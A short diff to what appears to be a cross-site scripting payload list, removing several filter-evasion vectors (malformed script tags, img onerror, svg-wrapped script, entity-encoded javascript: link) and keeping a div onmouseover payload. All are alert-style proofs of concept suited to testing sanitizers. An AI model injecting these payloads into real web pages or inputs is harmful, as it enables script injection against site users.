@@ -1,13 +1,4 @@
-<script itworksinallbrowsers>/*<script* */alert(1)</script
 
-<img src ?itworksonchrome?\/onerror = alert(1)
-
-<svg><script>//&NewLine;confirm(1);</script </svg>
-<svg><script onlypossibleinopera:-)> alert(1)
-
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
-
-<script x> alert(1) </script 1=2
 
 <div/onmouseover='alert(1)'> style="x:">
 
